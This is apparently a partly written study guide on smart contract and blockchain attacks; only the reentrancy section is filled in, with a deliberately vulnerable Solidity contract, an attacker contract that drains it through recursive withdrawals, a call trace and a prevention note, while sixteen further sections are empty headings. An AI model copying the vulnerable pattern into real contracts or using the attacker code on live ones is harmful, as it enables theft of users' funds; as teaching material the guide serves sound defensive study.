## Overview : 👉👉👉
```bash
** While blockchain technology is gaining traction, there are potential attacks. For instance, there are currently
emerging DeFi attacks; exchange hacks, among others. However, all blockchain-related attacks are not smart contract attacks.
Some are defraud, malicious, and weak protocol attacks.

The Attack Classification ::📑📑📑
The attacks on smart contract security and blockchain, in general, can be classified into four basic categories.
These categories includes :-

1. malicious attacks: Crypto-jacking, slack, and forum attack

2. weak protocol :  the different protocols are prone to one attack or the other. Some of those attacks are 51% attacks, 
                  Sybill attacks, 34% attack, and denial of service.
                  An Eclipse attack can occur in the same vein to manipulate the peer-to-peer (P2P) network.
                  
3. defraud : Defraud can trick a merchant into releasing his goods before the confirmation of a transaction. 
             In a practical sense, a Bitcoin transaction is confirmed after six transactions.a consumer may try to persuade a merchant to 
             release goods without waiting for up to 6 transactions, so attack techniques like one confirmation or no confirmation 
             can be initiated to double spend.

4. application bugs :  It arises when smart contract developers fail to see code errors in the decentralized application. 
                        An attacker can drain all the money from the smart contract wallet through simple code bugs. Hence, the need 
                        for smart contract audits.
```
## 1. Reentrancy
```bash 
** info : 
While the EVM cannot run multiple contracts at the same time, a contract calling a different contract
pauses the calling contract's execution and memory state until the call returns, 
at which point execution proceeds normally. This pausing and re-starting can create a vulnerability known as "re-entrancy".

** example :
contract Victim {
    mapping (address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        (bool success, ) = msg.sender.call.value(amount)("");
        require(success);
        balances[msg.sender] = 0;
    }
}
------------------------------------------------------------------------------------------
** Imagine this malicious contract from attackers :
contract Attacker {
    function beginAttack() external payable {
        Victim(VICTIM_ADDRESS).deposit.value(1 ether)();
        Victim(VICTIM_ADDRESS).withdraw();
    }

    function() external payable {
        if (gasleft() > 40000) {
            Victim(VICTIM_ADDRESS).withdraw();
        }
    }
}
---------------------------------------------------------------------------------------------
** Calling Attacker.beginAttack() will start a cycle that looks something like :

0.) Attacker's EOA calls Attacker.beginAttack() with 1 ETH
0.) Attacker.beginAttack() deposits 1 ETH into Victim
1.) Attacker -> Victim.withdraw()
  1.) Victim reads balances[msg.sender]
  1.) Victim sends ETH to Attacker (which executes default function)
    2.) Attacker -> Victim.withdraw()
    2.) Victim reads balances[msg.sender]
    2.) Victim sends ETH to Attacker (which executes default function)
      3.) Attacker -> Victim.withdraw()
      3.) Victim reads balances[msg.sender]
      3.) Victim sends ETH to Attacker (which executes default function)
        4.) Attacker no longer has enough gas, returns without calling again
      3.) balances[msg.sender] = 0;
    2.) balances[msg.sender] = 0; (it was already 0)
  1.) balances[msg.sender] = 0; (it was already 0)
---------------------------------------------------------------------------------------------------------------->>>
Calling Attacker.beginAttack with 1 ETH will re-entrancy attack Victim, withdrawing more ETH 
than it provided (taken from other users' balances, causing the Victim contract to become under-collateralized.
---------------------------------------------------------------------------------------------------------------->>>

** Prevention : 
By simply switching the order of the storage update and external call, 
we prevent the re-entrancy condition that enabled the attack. Calling back into withdraw,
while possible, will not benefit the attacker, since the balances storage will already be set to 0.

```
## 2. Arithmatic over/underflows
```bash 
** info : 
** example: 
** Prevention : 
```
## 3. Unexpected ethers 
```bash 
** info : 
** example: 
** Prevention : 
```
## 4. Delegatecall
```bash 
** info : 
** example: 
** Prevention : 
```
## 5. Default Visibilities
```bash 
** info : 
** example: 
** Prevention : 
```
## 6. Entropy Illusion 
```bash 
** info : 
** example: 
** Prevention : 
```
## 7. External Contract Referencing 
```bash 
** info : 
** example: 
** Prevention : 
```
## 8. Short Address/Parameters Attack 
```bash 
** info : 
** example: 
** Prevention : 
```
## 9. Unchecked Call Return Values 
```bash 
** info : 
** example: 
** Prevention : 
```
## 10. Race conditions/front running 
```bash
** info : 
** example: 
** Prevention : 
```
## 11. DDOS attack 
```bash 
** info : 
** example: 
** Prevention : 
```
## 12. Block-timestamp Manipulation 
```bash 
** info : 
** example: 
** Prevention : 
```
## 13. Constructors with Care 
```bash 
** info : 
** example: 
** Prevention : 
```
## 14. Uninitialized Storage Pointers 
```bash 
** info : 
** example: 
** Prevention : 
```
## 15. Floating Point and Precision 
```bash 
** info : 
** example: 
** Prevention : 
```
## 16. Tx.Origin Authentication 
```bash 
```
## 17. Contract Libraries  
```bash 
** info : 
** example: 
** Prevention : 
```




